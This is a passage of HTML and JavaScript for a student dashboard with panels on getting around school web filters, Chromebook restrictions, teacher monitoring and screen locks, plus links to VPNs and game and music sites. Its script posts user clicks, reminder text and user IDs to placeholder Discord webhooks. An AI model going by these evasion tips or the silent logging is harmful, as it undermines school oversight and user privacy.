          <p><strong>Method 3: Strategic Timing</strong></p>
          <p>Ask during group work or a transition period when the teacher's attention is divided. Avoid asking during lectures or tests.</p>
          <p class="info-text" style="color: var(--error-color);">
            <strong>Disclaimer:</strong> This is for informational context within a simulated environment. Using deceptive tactics to leave class can lead to disciplinary action and loss of trust. Always follow school rules and teacher instructions.
          </p>
        </div>
        
        <div id="wifiBypass" class="bypass-content">
          <h3>WiFi Bypass Methods</h3>
          <p>Go to the "üì° School Wifi Information" panel for detailed information on available networks and guest access credentials. Using guest networks may offer slightly less monitoring, but is still logged.</p>
          <p class="info-text">
            <strong>Advanced (Requires External Tools):</strong> Some users might employ mobile hotspots or portable Wi-Fi devices, but these are often detectable and could lead to network-related infractions if used on school property.
          </p>
        </div>
        
        <div id="monitoringBypass" class="bypass-content">
          <h3>Teacher Monitoring Bypass (Simulated)</h3>
          <p><strong>Method 1: Multiple Tabs/Windows</strong></p>
          <p>Keep an educational tab open in the foreground and quickly switch to it if you suspect the teacher is checking. Requires quick reflexes.</p>
          <p><strong>Method 2: Strategic Positioning</strong></p>
          <p>If using a laptop, position it in a way that the screen is not easily visible from the teacher's desk. Be aware of reflective surfaces.</p>
          <p><strong>Method 3: Taskbar/Dock Hiding</strong></p>
          <p>Utilize full-screen modes or hide taskbars/docks to minimize visual cues of unauthorized applications.</p>
          <p class="info-text" style="color: var(--error-color);">
            <strong>Warning:</strong> Bypassing teacher monitoring systems is a serious offense. Many modern monitoring tools can track all activity, even quick switches. Attempting this can lead to immediate detection and disciplinary consequences.
          </p>
        </div>
        
        <div id="chromebookBypass" class="bypass-content">
          <h3>Chromebook Bypass Methods (Simulated)</h3>
          <p><strong>Method 1: Guest Mode (if available)</strong></p>
          <p>Some school Chromebooks may allow a temporary "Guest Mode" login, which often has fewer restrictions than a school-managed account. This typically wipes data on logout.</p>
          <p><strong>Method 2: Specific Browser Extensions</strong></p>
          <p>Certain VPN or proxy browser extensions, if they can be installed and are not blocked, can bypass web filters. However, these are frequently detected and removed by IT.</p>
          <p><strong>Method 3: Linux (Developer Mode)</strong></p>
          <p>Enabling Developer Mode on a Chromebook can allow installation of alternative operating systems like Linux, which are not subject to Chrome OS restrictions. This often voids warranties and is easily detectable by IT.</p>
          <p class="info-text" style="color: var(--error-color);">
            <strong>Warning:</strong> Attempting to bypass Chromebook restrictions can result in permanent device damage, loss of school data, and severe disciplinary action.
          </p>
        </div>
        
        <div id="webfilterBypass" class="bypass-content">
          <h3>Web Filter Bypass Methods (Simulated)</h3>
          <p><strong>Method 1: Web Proxies / VPNs</strong></p>
          <p>Use a web-based proxy service or a VPN. Many school filters actively block known proxy sites and VPN protocols, so finding a working one is challenging and temporary.</p>
          <p><strong>Method 2: Google Translate / Reader View</strong></p>
          <p>Sometimes, pasting a blocked URL into Google Translate and viewing it through Google's servers can bypass simple filters. Similarly, some browsers' "Reader View" can load content differently.</p>
          <p><strong>Method 3: URL Shorteners / Archives</strong></p>
          <p>Using URL shorteners or web archive sites might occasionally bypass filters that rely on direct URL matching, but this is less common now.</p>
          <p class="info-text" style="color: var(--error-color);">
            <strong>Warning:</strong> Attempting to bypass web filters is a violation of the school's Acceptable Use Policy and can lead to disciplinary action. All network traffic is logged.
          </p>
        </div>
        
        <div id="screenlockBypass" class="bypass-content">
          <h3>Screen Lock Bypass Methods (Simulated)</h3>
          <p><strong>Method 1: Physical Exploits (Device Specific)</strong></p>
          <p>Some older devices might have vulnerabilities related to external keyboards, specific button combinations, or sleep/wake cycles that can temporarily bypass a screen lock. These are rare on modern, updated school devices.</p>
          <p><strong>Method 2: Software Glitches</strong></p>
          <p>Very rarely, a specific sequence of actions (e.g., repeatedly opening and closing an app, triggering a crash) might cause a temporary glitch that allows access without the passcode. This is highly unreliable.</p>
          <p><strong>Method 3: Resetting (Data Loss)</strong></p>
          <p>The most common "bypass" involves factory resetting the device, which will wipe all data and return it to its original state. This requires admin permissions or physical access to recovery modes and results in complete data loss.</p>
          <p class="info-text" style="color: var(--error-color);">
            <strong>Warning:</strong> Unauthorized attempts to bypass device screen locks are serious security violations. Such actions can lead to device damage, data loss, and severe disciplinary consequences. Always report forgotten passwords to IT.
          </p>
        </div>
      </div>

      <!-- VPN Panel -->
      <div id="vpnPanel" class="info-panel">
        <h2>üîê VPN Websites</h2>
        <h3>Access to Virtual Private Network Services</h3>
        <p>A VPN (Virtual Private Network) can encrypt your internet connection and mask your IP address, potentially bypassing some network restrictions. However, many school networks actively block VPN services.</p>
        <div class="links-list list-grid-4">
          <a href="https://protonvpn.com/" target="_blank">ProtonVPN</a>
          <a href="https://windscribe.com/" target="_blank">Windscribe</a>
          <a href="https://privatize.tech/" target="_blank">Privatize.tech</a>
          <a href="https://nordvpn.com/" target="_blank">NordVPN</a>
          <a href="https://expressvpn.com/" target="_blank">ExpressVPN</a>
          <a href="https://surfshark.com/" target="_blank">Surfshark</a>
          <a href="https://hide.me/en/" target="_blank">Hide.me</a>
          <a href="https://cyberghostvpn.com/" target="_blank">CyberGhost VPN</a>
        </div>
        <div class="info-text">
          <p><strong>Note:</strong> While VPNs can enhance privacy, their use on school networks to bypass security or content filters may violate school policy. The effectiveness of these links may vary as school IT departments frequently update their blocklists.</p>
        </div>
      </div>

      <!-- Gaming Panel -->
      <div id="gamingPanel" class="info-panel">
        <h2>üéÆ Gaming Websites</h2>
        <h3>Collection of Unblocked Gaming Sites (Use with Discretion)</h3>
        <p>Access various online games. Please be mindful of school policies regarding non-educational use of devices.</p>
        <div class="coming-soon">
          Curated List of Unblocked Gaming Sites Coming Soon!
          <p>We are compiling a list of fun and engaging games that might be accessible during free time. Remember to balance gaming with your studies!</p>
        </div>
        <div class="links-list list-grid-3">
          <a href="https://www.google.com/search?q=unblocked+games" target="_blank">Search Unblocked Games</a>
          <a href="https://scratch.mit.edu/explore/games" target="_blank">Scratch Games</a>
          <a href="https://play.geforcenow.com/" target="_blank">GeForce Now (Cloud Gaming)</a>
          <a href="https://poki.com/" target="_blank">Poki (Online Games)</a>
          <a href="https://www.miniclip.com/" target="_blank">Miniclip</a>
          <a href="https://tyrone.games/" target="_blank">Tyrone Games</a>
          <a href="https://itch.io/games/free" target="_blank">Itch.io Free Games</a>
          <a href="https://kbhgames.com/" target="_blank">Kbh Games</a>
          <a href="https://crazygames.com/" target="_blank">CrazyGames</a>
        </div>
      </div>

      <!-- Music Panel -->
      <div id="musicPanel" class="info-panel">
        <h2>üéµ Music Websites</h2>
        <h3>Unblocked Music Streaming & Listening Sites</h3>
        <p>Enjoy music during study breaks or for educational purposes. Be aware of volume and headphone usage policies.</p>
        <div class="coming-soon">
          Curated List of Unblocked Music Sites Coming Soon!
          <p>Listening to music can help with focus and relaxation. We'll provide links to sites that should be accessible.</p>
        </div>
        <div class="links-list list-grid-3">
          <a href="https://soundcloud.com/" target="_blank">SoundCloud</a>
          <a href="https://bandcamp.com/" target="_blank">Bandcamp</a>
          <a href="https://www.youtube.com/music" target="_blank">YouTube Music</a>
          <a href="https://www.jambox.io/" target="_blank">Jambox.io (Royalty Free)</a>
          <a href="https://www.audiomack.com/" target="_blank">Audiomack</a>
          <a href="https://myfreemp3.to/" target="_blank">MyFreeMP3</a>
          <a href="https://listenonrepeat.com/" target="_blank">ListenOnRepeat</a>
          <a href="https://www.tunefind.com/" target="_blank">Tunefind</a>
          <a href="https://musify.club/" target="_blank">Musify.club</a>
        </div>
      </div>

    </div> <!-- End infoPanelsContainer -->

    <!-- Canvas for Notes -->
    <div id="canvasContainer">
      <h2>üñåÔ∏è Notes Canvas</h2>
      <canvas id="notesCanvas" width="800" height="500"></canvas>
      <div id="canvasControls">
        <button id="clearCanvasBtn">Clear Canvas</button>
        <button id="closeCanvasBtn">Close Notes</button>
      </div>
    </div>
  </div> <!-- End dashboard -->

  <script>
    // Global dashboard object to manage all functionality
    const dashboard = {
      // Configuration for dashboard logging webhooks (new interactions)
      dashboardLoggingWebhooks: {
        buttonClick: 'https://discord.com/api/webhooks/1403512345678901234/some-token-for-button-clicks', // Placeholder
        panelToggle: 'https://discord.com/api/webhooks/1403512345678901235/some-token-for-panel-toggles', // Placeholder
        reminderAction: 'https://discord.com/api/webhooks/1403512345678901236/some-token-for-reminder-actions', // Placeholder
        taskAction: 'https://discord.com/api/webhooks/1403512345678901237/some-token-for-task-actions', // Placeholder
        canvasExport: 'https://discord.com/api/webhooks/1403512345678901238/some-token-for-canvas-exports', // Placeholder
        themeChange: 'https://discord.com/api/webhooks/1403512345678901239/some-token-for-theme-changes', // Placeholder
        // Add more webhooks for other specific dashboard interactions as needed
      },

      // User context from successful login (placeholder, actual data from login system)
      currentUser: {
        name: 'Beta.user',
        username: 'beta.user',
        userID: '281573',
        role: 'Student'
      },

      // Initialize all dashboard functionality
      init: function() {
        this.loadSettings(); // Load user settings like theme first
        this.initSessionTimer();
        this.initClock();
        this.generateCalendar();
        this.initThemeToggle();
        this.initButtons();
        this.initCanvas();
        this.initPanels();
        this.initReminders(); // Initialize new reminder system
        this.initTasks();      // Initialize new task manager
        this.initPomodoro();   // Initialize new Pomodoro Timer
        this.initCalculator(); // Initialize new Calculator
        this.initUnitConverter(); // Initialize new Unit Converter
        this.initVirtualAssistant(); // Initialize new Virtual Assistant
        this.initProfileSettings(); // Initialize profile settings
        this.initDashboardCustomization(); // Initialize dashboard customization
        this.initGlobalInteractionLogger(); // Log general interactions
        this.startMotivationQuoteRotation(); // Start rotating motivation quotes
        this.initAnnouncementBarScroll(); // Re-initialize announcement bar scroll in case it was modified
      },
      
      // Helper function to send webhook for dashboard actions
      sendDashboardWebhook: async function(type, details) {
        const url = this.dashboardLoggingWebhooks[type];
        if (!url) {
          console.warn(`Webhook URL for type "${type}" not found.`);
          return;
        }

        const embed = {
          title: `Dashboard Action: ${type.replace(/([A-Z])/g, ' $1').trim()}`,
          color: 0x3498db, // General blue color for dashboard actions
          fields: [
            { name: "User", value: this.currentUser.username, inline: true },
            { name: "User ID", value: this.currentUser.userID, inline: true },
            { name: "Time", value: new Date().toISOString(), inline: false },
            ...Object.entries(details).map(([key, value]) => ({
              name: key.charAt(0).toUpperCase() + key.slice(1),
              value: String(value),
              inline: true
            }))
          ]
        };

        try {
          await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ embeds: [embed] }),
          });
        } catch (e) {
          console.error(`Failed to send dashboard webhook for ${type}:`, e);
        }
      },

      // Store user settings in localStorage
      userSettings: {
        theme: 'default', // 'default', 'light', 'blue', 'green', 'red', 'purple'
        mainGridLayout: 'default', // 'default', 'grid2col', 'grid1col'
        // Add more settings here
      },

      loadSettings: function() {
        const savedSettings = localStorage.getItem('dashboardSettings');
        if (savedSettings) {
          this.userSettings = JSON.parse(savedSettings);
        }
        // Apply theme immediately
        this.applyTheme(this.userSettings.theme, false); // Don't log on load
        this.applyLayout(this.userSettings.mainGridLayout, false); // Don't log on load
      },

      saveSettings: function() {
        localStorage.setItem('dashboardSettings', JSON.stringify(this.userSettings));
      },
      
      // Initialize session timer
      initSessionTimer: function() {
        let sessionSeconds = 0;
        // Load existing session time from localStorage if available
        const savedSessionTime = localStorage.getItem('sessionSeconds');
        if (savedSessionTime) {
          sessionSeconds = parseInt(savedSessionTime, 10);
        }

        function formatTime(seconds) {
          const hrs = String(Math.floor(seconds / 3600)).padStart(2, '0');
          const mins = String(Math.floor((seconds % 3600) / 60)).padStart(2, '0');
          const secs = String(seconds % 60).padStart(2, '0');
          return `${hrs}:${mins}:${secs}`;
        }
        
        const updateSessionTime = () => {
          sessionSeconds++;
          document.getElementById('sessionTime').innerText = `‚è≥ Session Time: ${formatTime(sessionSeconds)}`;
          localStorage.setItem('sessionSeconds', sessionSeconds.toString()); // Save every second
        };
        
        updateSessionTime();
        setInterval(updateSessionTime, 1000);
      },
      
      // Initialize real-time clock
      initClock: function() {
        function updateClock() {
          const now = new Date();
          const options = { hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: true };
          const timeStr = now.toLocaleTimeString(undefined, options);
          const dateStr = now.toLocaleDateString(undefined, { month: 'long', day: 'numeric', year: 'numeric' });

          document.getElementById('realTimeClock').innerText = 'üïí ' + timeStr;
          document.getElementById('realDate').innerText = 'üìÖ ' + dateStr;
        }
        
        updateClock();
        setInterval(updateClock, 1000);
      },
      
      // Generate calendar
      generateCalendar: function() {
        const calendar = document.getElementById('calendar');
        calendar.innerHTML = ''; 
        const days = ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'];
        days.forEach(day => {
          const div = document.createElement('div');
          div.innerText = day;
          calendar.appendChild(div);
        });

        const date = new Date();
        const year = date.getFullYear();
        const month = date.getMonth();
        const today = date.getDate();

        const firstDay = new Date(year, month, 1).getDay();
        const lastDate = new Date(year, month + 1, 0).getDate();

        for (let i = 0; i < firstDay; i++) {
          const empty = document.createElement('div');
          calendar.appendChild(empty);
        }

        for (let i = 1; i <= lastDate; i++) {
          const cell = document.createElement('div');
          cell.innerText = i;
          if (i === today) cell.classList.add('today');
          calendar.appendChild(cell);
        }
      },
      
      // Theme toggling functionality
      applyTheme: function(themeName, logChange = true) {
        const body = document.body;
        body.classList.remove('light-theme', 'blue-accent-theme', 'green-accent-theme', 'red-accent-theme', 'purple-accent-theme');
        
        const themeToggleBtn = document.getElementById('themeToggle');
        themeToggleBtn.classList.remove('light-theme-active'); // Reset class

        const root = document.documentElement; // For CSS variables

        switch (themeName) {
          case 'light':
            body.classList.add('light-theme');
            themeToggleBtn.innerText = '‚òÄÔ∏è Light Mode';
            themeToggleBtn.classList.add('light-theme-active');
            root.style.setProperty('--accent-color', '#994d00');
            root.style.setProperty('--accent-color-light', '#cc6600');
            root.style.setProperty('--text-color', '#1a1a1a');
            root.style.setProperty('--background-color', '#f9f2dc');
            root.style.setProperty('--box-background', '#ffd966');
            root.style.setProperty('--box-shadow-color', 'rgba(255, 145, 77, 0.6)');
            root.style.setProperty('--input-background', '#fff3cc');
            root.style.setProperty('--error-color', '#cc0000');
            root.style.setProperty('--success-color', '#338833');
            break;
          case 'blue':
            root.style.setProperty('--accent-color', '#2196F3');
            root.style.setProperty('--accent-color-light', '#42a5f5');
            root.style.setProperty('--text-color', '#f9f2dc');
            root.style.setProperty('--background-color', '#1a1a1a');
            root.style.setProperty('--box-background', '#2a2a2a');
            root.style.setProperty('--box-shadow-color', 'rgba(33, 150, 243, 0.3)');
            root.style.setProperty('--input-background', '#1c1c1c');
            root.style.setProperty('--error-color', '#ff4c4c');
            root.style.setProperty('--success-color', '#66bb6a');
            themeToggleBtn.innerText = 'üíô Blue Accent';
            break;
          case 'green':
            root.style.setProperty('--accent-color', '#4CAF50');
            root.style.setProperty('--accent-color-light', '#66bb6a');
            root.style.setProperty('--text-color', '#f9f2dc');
            root.style.setProperty('--background-color', '#1a1a1a');
            root.style.setProperty('--box-background', '#2a2a2a');
            root.style.setProperty('--box-shadow-color', 'rgba(76, 175, 80, 0.3)');
            root.style.setProperty('--input-background', '#1c1c1c');
            root.style.setProperty('--error-color', '#ff4c4c');
            root.style.setProperty('--success-color', '#66bb6a');
            themeToggleBtn.innerText = 'üíö Green Accent';
            break;
          case 'red':
            root.style.setProperty('--accent-color', '#F44336');
            root.style.setProperty('--accent-color-light', '#ef5350');
            root.style.setProperty('--text-color', '#f9f2dc');
            root.style.setProperty('--background-color', '#1a1a1a');
            root.style.setProperty('--box-background', '#2a2a2a');
            root.style.setProperty('--box-shadow-color', 'rgba(244, 67, 54, 0.3)');
            root.style.setProperty('--input-background', '#1c1c1c');
            root.style.setProperty('--error-color', '#ff4c4c');
            root.style.setProperty('--success-color', '#66bb6a');
            themeToggleBtn.innerText = '‚ù§Ô∏è Red Accent';
            break;
          case 'purple':
            root.style.setProperty('--accent-color', '#9C27B0');
            root.style.setProperty('--accent-color-light', '#ab47bc');
            root.style.setProperty('--text-color', '#f9f2dc');
            root.style.setProperty('--background-color', '#1a1a1a');
            root.style.setProperty('--box-background', '#2a2a2a');
            root.style.setProperty('--box-shadow-color', 'rgba(156, 39, 176, 0.3)');
            root.style.setProperty('--input-background', '#1c1c1c');
            root.style.setProperty('--error-color', '#ff4c4c');
            root.style.setProperty('--success-color', '#66bb6a');
            themeToggleBtn.innerText = 'üíú Purple Accent';
            break;
          default: // 'default' (dark)
            root.style.setProperty('--accent-color', '#ff914d');
            root.style.setProperty('--accent-color-light', '#ffb67a');
            root.style.setProperty('--text-color', '#f9f2dc');
            root.style.setProperty('--background-color', '#1a1a1a');
            root.style.setProperty('--box-background', '#2a2a2a');
            root.style.setProperty('--box-shadow-color', 'rgba(255, 145, 77, 0.3)');
            root.style.setProperty('--input-background', '#1c1c1c');
            root.style.setProperty('--error-color', '#ff4c4c');
            root.style.setProperty('--success-color', '#66bb6a');
            themeToggleBtn.innerText = 'üåô Dark Mode';
        }
        this.userSettings.theme = themeName;
        this.saveSettings();
        if(logChange) {
          this.sendDashboardWebhook('themeChange', { theme: themeName });
        }
      },

      initThemeToggle: function() {
        const themeBtn = document.getElementById('themeToggle');
        themeBtn.addEventListener('click', () => {
          let newTheme;
          if (this.userSettings.theme === 'default') {
            newTheme = 'light';
          } else {
            newTheme = 'default';
          }
          this.applyTheme(newTheme);
        });

        // Event listeners for specific theme buttons in customization panel
        document.getElementById('defaultThemeBtn').addEventListener('click', () => this.applyTheme('default'));
        document.getElementById('lightThemeBtn').addEventListener('click', () => this.applyTheme('light'));
        document.getElementById('blueThemeBtn').addEventListener('click', () => this.applyTheme('blue'));
        document.getElementById('greenThemeBtn').addEventListener('click', () => this.applyTheme('green'));
        document.getElementById('redThemeBtn').addEventListener('click', () => this.applyTheme('red'));
        document.getElementById('purpleThemeBtn').addEventListener('click', () => this.applyTheme('purple'));
      },
      
      // Initialize common buttons
      initButtons: function() {
        document.getElementById('panicBtn').addEventListener('click', () => {
          this.sendDashboardWebhook('buttonClick', { action: 'Panic Button', target: 'clever.com' });
          window.open('https://clever.com', '_blank');
        });

        document.getElementById('restartBtn').addEventListener('click', () => {
          this.sendDashboardWebhook('buttonClick', { action: 'Restart Button' });
          if(confirm('Are you sure you want to kill the page (restart)? This will clear session time.')) {
            localStorage.removeItem('sessionSeconds'); // Clear session time on restart
            document.body.innerHTML = `<div style="display:flex; justify-content:center; align-items:center; height:100vh; background:#1a1a1a; color:#f9f2dc; font-family:'Montserrat', sans-serif; font-size:24px;">Page has been killed. Restart to continue.</div>`;
          }
        });

        document.getElementById('fixIssuesBtn').addEventListener('click', () => {
          this.sendDashboardWebhook('buttonClick', { action: 'Fix Issues Button' });
          alert('Running diagnostics...\nNo critical issues found. Your dashboard is running smoothly!');
        });
        
        document.getElementById('fullScreenBtn').addEventListener('click', () => {
          this.sendDashboardWebhook('buttonClick', { action: 'Full Screen Toggle' });
          if (!document.fullscreenElement) {
            document.documentElement.requestFullscreen().catch(err => {
              alert(`Error attempting to enable full-screen mode: ${err.message}`);
            });
          } else {
            document.exitFullscreen();
          }
        });
        
        let zoomLevel = 1;
        const zoomStep = 0.1;
        const minZoom = 0.5;
        const maxZoom = 2;

        document.getElementById('zoomInBtn').addEventListener('click', () => {
          this.sendDashboardWebhook('buttonClick', { action: 'Zoom In' });
          if (zoomLevel < maxZoom) {
            zoomLevel += zoomStep;
            document.body.style.zoom = zoomLevel;
          }
        });

        document.getElementById('zoomOutBtn').addEventListener('click', () => {
          this.sendDashboardWebhook('buttonClick', { action: 'Zoom Out' });
          if (zoomLevel > minZoom) {
            zoomLevel -= zoomStep;
            document.body.style.zoom = zoomLevel;
          }
        });

        // Logout Button
        document.getElementById('logoutBtn').addEventListener('click', () => {
          this.sendDashboardWebhook('buttonClick', { action: 'Log Out' });
          if(confirm('Are you sure you want to log out?')) {
            // Clear all local storage related to dashboard session, but keep login attempts/reset code related items
            localStorage.removeItem('sessionSeconds');
            localStorage.removeItem('reminders');
            localStorage.removeItem('tasks');
            localStorage.removeItem('dashboardSettings');
            // Reload the page to return to login screen
            window.location.reload(); 
          }
        });
      },
      
      // Initialize canvas functionality
      initCanvas: function() {
        const notesBtn = document.getElementById('notesBtn');
        const canvasContainer = document.getElementById('canvasContainer');
        const mainGrid = document.getElementById('mainGrid');
        const updatesNotifications = document.getElementById('updatesNotifications');
        const mainControlsContainer = document.querySelector('.main-control-buttons-container');

        notesBtn.addEventListener('click', () => {
          this.sendDashboardWebhook('buttonClick', { action: 'Open Notes Canvas' });
          mainGrid.style.display = 'none';
          updatesNotifications.style.display = 'none';
          mainControlsContainer.style.display = 'none';
          canvasContainer.style.display = 'block';
        });

        document.getElementById('closeCanvasBtn').addEventListener('click', () => {
          this.sendDashboardWebhook('buttonClick', { action: 'Close Notes Canvas' });
          canvasContainer.style.display = 'none';
          mainGrid.style.display = 'flex';
          updatesNotifications.style.display = 'flex';
          mainControlsContainer.style.display = 'block';
        });

        const clearCanvasBtn = document.getElementById('clearCanvasBtn');

        const canvas = document.getElementById('notesCanvas');
        const ctx = canvas.getContext('2d');

        // Restore canvas from local storage on load
        const savedCanvas = localStorage.getItem('notesCanvasData');
        if (savedCanvas) {
            const img = new Image();
            img.onload = () => {
                ctx.drawImage(img, 0, 0);
            };
            img.src = savedCanvas;
        } else {
            ctx.fillStyle = getComputedStyle(canvas).backgroundColor; // Use CSS background color
            ctx.fillRect(0, 0, canvas.width, canvas.height);
        }

        let drawing = false;

        function getPos(evt) {
          const rect = canvas.getBoundingClientRect();
          return {
            x: (evt.clientX || evt.touches[0].clientX) - rect.left,
            y: (evt.clientY || evt.touches[0].clientY) - rect.top
          };
        }

        const startDrawing = (e) => {
          drawing = true;
          const pos = getPos(e);
          ctx.beginPath();
          ctx.moveTo(pos.x, pos.y);
          e.preventDefault();
        };

        const draw = (e) => {
          if (!drawing) return;
          const pos = getPos(e);
          ctx.lineTo(pos.x, pos.y);
          ctx.strokeStyle = getComputedStyle(document.documentElement).getPropertyValue('--accent-color');
          ctx.lineWidth = 3; // Slightly thicker
          ctx.lineCap = 'round';
          ctx.lineJoin = 'round'; // Smoother lines
          ctx.stroke();
          e.preventDefault();
        };

        const stopDrawing = () => {
          drawing = false;
          // Save canvas to local storage after each stroke
          localStorage.setItem('notesCanvasData', canvas.toDataURL());
        };

        canvas.addEventListener('mousedown', startDrawing);
        canvas.addEventListener('touchstart', startDrawing);
        canvas.addEventListener('mousemove', draw);
        canvas.addEventListener('touchmove', draw);
        ['mouseup', 'mouseleave', 'touchend', 'touchcancel'].forEach(evtName => {
          canvas.addEventListener(evtName, stopDrawing);
        });

        clearCanvasBtn.addEventListener('click', () => {
          this.sendDashboardWebhook('buttonClick', { action: 'Clear Notes Canvas' });
          ctx.clearRect(0, 0, canvas.width, canvas.height);
          ctx.fillStyle = getComputedStyle(canvas).backgroundColor; // Fill with current background
          ctx.fillRect(0, 0, canvas.width, canvas.height);
          localStorage.removeItem('notesCanvasData'); // Clear saved canvas data
        });

        document.getElementById('screenshotBtn').addEventListener('click', () => {
          this.sendDashboardWebhook('buttonClick', { action: 'Screenshot Dashboard' });
          const elementToCapture = document.body; 
          html2canvas(elementToCapture, {
            scale: 2, // Capture at higher resolution
            useCORS: true // Important for images loaded from other domains if any
          }).then(canvasImg => {
            const link = document.createElement('a');
            link.download = 'dashboard_screenshot.png';
            link.href = canvasImg.toDataURL('image/png');
            link.click();
            this.sendDashboardWebhook('canvasExport', { type: 'Dashboard Screenshot', format: 'png' });
          }).catch(err => {
            console.error("Error generating screenshot:", err);
            alert("Failed to generate screenshot. Please try again.");
          });
        });
        
        document.getElementById('exportNotesBtn').addEventListener('click', () => {
          this.sendDashboardWebhook('buttonClick', { action: 'Export Notes Canvas' });
          const link = document.createElement('a');
          link.download = 'notes_canvas.png';
          link.href = canvas.toDataURL('image/png');
          link.click();
          this.sendDashboardWebhook('canvasExport', { type: 'Notes Canvas', format: 'png' });
        });

        const toggleBtn = document.getElementById('toggleSectionsBtn');
        toggleBtn.addEventListener('click', () => {
          this.sendDashboardWebhook('buttonClick', { action: 'Toggle Main Sections' });
          if (mainGrid.style.display === 'none') {
            mainGrid.style.display = 'flex';
            updatesNotifications.style.display = 'flex';
            mainControlsContainer.style.display = 'block';
            toggleBtn.innerText = '‚¨ÜÔ∏è Toggle Sections';
          } else {
            mainGrid.style.display = 'none';
            updatesNotifications.style.display = 'none';
            mainControlsContainer.style.display = 'none';
            toggleBtn.innerText = '‚¨áÔ∏è Toggle Sections';
          }
        });
      },
      
      // Initialize panels (hide all initially)
      initPanels: function() {
        document.querySelectorAll('.info-panel').forEach(panel => {
          panel.style.display = 'none';
        });
        document.querySelectorAll('.ipad-content').forEach(content => {
          content.style.display = 'none';
        });
        document.querySelectorAll('.bypass-content').forEach(content => {
          content.style.display = 'none';
        });
        // Set a default active content for iPad and Bypass panels
        document.getElementById('ipadRestrictions').classList.add('active-content');
        document.getElementById('bathroomBypass').classList.add('active-content');
      },
      
      // Generic panel toggle function
      togglePanel: function(panelId) {
        this.sendDashboardWebhook('panelToggle', { panel: panelId, action: 'toggle' });
        const panel = document.getElementById(panelId);
        // Close all other panels
        document.querySelectorAll('.info-panel').forEach(p => {
          if (p.id !== panelId && p.style.display === 'block') {
            p.style.display = 'none';
          }
        });
        panel.style.display = panel.style.display === 'none' ? 'block' : 'none';
      },
      
      showIpadContent: function(contentId) {
        this.sendDashboardWebhook('buttonClick', { action: 'Show iPad Content', content: contentId });
        document.querySelectorAll('.ipad-content').forEach(content => {
          content.classList.remove('active-content');
        });
        document.getElementById('ipad' + contentId.charAt(0).toUpperCase() + contentId.slice(1)).classList.add('active-content');
      },
      
      showBypassContent: function(contentId) {
        this.sendDashboardWebhook('buttonClick', { action: 'Show Bypass Content', content: contentId });
        document.querySelectorAll('.bypass-content').forEach(content => {
          content.classList.remove('active-content');
        });
        document.getElementById(contentId + 'Bypass').classList.add('active-content');
      },

      // Reminder System functionality
      reminders: [],
      initReminders: function() {
        // Load reminders from localStorage
        const savedReminders = localStorage.getItem('reminders');
        if (savedReminders) {
          this.reminders = JSON.parse(savedReminders);
        }
        this.renderReminders();
        document.getElementById('addReminderBtn').addEventListener('click', () => this.addReminder());
        this.startReminderChecker(); // Start checking for upcoming reminders
      },

      saveReminders: function() {
        localStorage.setItem('reminders', JSON.stringify(this.reminders));
      },

      renderReminders: function() {
        const reminderList = document.getElementById('reminderList');
        reminderList.innerHTML = ''; // Clear existing reminders

        if (this.reminders.length === 0) {
          reminderList.innerHTML = '<p>No reminders set yet. Use the form above to add one!</p>';
          return;
        }

        // Sort reminders by date/time
        this.reminders.sort((a, b) => new Date(a.dateTime) - new Date(b.dateTime));

        this.reminders.forEach(reminder => {
          const reminderItem = document.createElement('div');
          reminderItem.classList.add('reminder-item');
          if (reminder.completed) {
            reminderItem.classList.add('completed');
          }
          if (reminder.priority) {
            reminderItem.classList.add(`${reminder.priority}-priority`);
          }

          const dueDate = new Date(reminder.dateTime);
          const now = new Date();
          const isOverdue = !reminder.completed && dueDate < now;

          let statusText = '';
          if (reminder.completed) {
            statusText = ' (Completed)';
          } else if (isOverdue) {
            statusText = ' (OVERDUE!)';
            reminderItem.classList.add('high-priority'); // Visual highlight for overdue
          }

          reminderItem.innerHTML = `
            <div class="reminder-item-details">
              <strong>${reminder.text}</strong>
              <small>Due: ${dueDate.toLocaleString()} ${statusText}</small>
            </div>
            <div class="reminder-item-controls">
              <button class="complete" data-id="${reminder.id}" title="Mark Complete">${reminder.completed ? '‚úÖ' : '‚òëÔ∏è'}</button>
              <button class="delete" data-id="${reminder.id}" title="Delete Reminder">üóëÔ∏è</button>
            </div>
          `;
          reminderList.appendChild(reminderItem);
        });

        // Attach event listeners for dynamic buttons
        reminderList.querySelectorAll('.complete').forEach(button => {
          button.addEventListener('click', (e) => this.toggleReminderComplete(e.target.dataset.id));
        });
        reminderList.querySelectorAll('.delete').forEach(button => {
          button.addEventListener('click', (e) => this.deleteReminder(e.target.dataset.id));
        });
      },

      addReminder: function() {
        const textInput = document.getElementById('reminderText');
        const dateTimeInput = document.getElementById('reminderDateTime');
        const priorityInput = document.getElementById('reminderPriority');

        const text = textInput.value.trim();
        const dateTime = dateTimeInput.value;
        const priority = priorityInput.value;

        if (text && dateTime) {
          const newReminder = {
            id: Date.now().toString(),
            text,
            dateTime,
            priority,
            completed: false
          };
          this.reminders.push(newReminder);
          this.saveReminders();
          this.renderReminders();
          textInput.value = '';
          dateTimeInput.value = '';
          this.sendDashboardWebhook('reminderAction', { action: 'Add Reminder', reminder: text, priority: priority });
        } else {
          alert('Please enter both a reminder description and a date/time.');
        }
      },

      toggleReminderComplete: function(id) {
        const index = this.reminders.findIndex(r => r.id === id);
        if (index !== -1) {
          this.reminders[index].completed = !this.reminders[index].completed;
          this.saveReminders();
          this.renderReminders();
          this.sendDashboardWebhook('reminderAction', { action: 'Toggle Complete', reminderId: id, status: this.reminders[index].completed });
        }
      },

      deleteReminder: function(id) {
        if (confirm('Are you sure you want to delete this reminder?')) {
          this.reminders = this.reminders.filter(r => r.id !== id);
          this.saveReminders();
          this.renderReminders();
          this.sendDashboardWebhook('reminderAction', { action: 'Delete Reminder', reminderId: id });
        }
      },

      // Reminder notification system
      startReminderChecker: function() {
        setInterval(() => {
          const now = new Date();
          this.reminders.forEach(reminder => {
            if (!reminder.completed && new Date(reminder.dateTime) > now && new Date(reminder.dateTime).getTime() - now.getTime() < (5 * 60 * 1000) && !reminder.notified) { // Notify 5 mins before
              this.showNotification(`Upcoming Reminder: ${reminder.text} in ${Math.round((new Date(reminder.dateTime).getTime() - now.getTime()) / 60000)} minutes!`, reminder.priority === 'high');
              reminder.notified = true; // Mark as notified
              this.saveReminders(); // Persist notification status
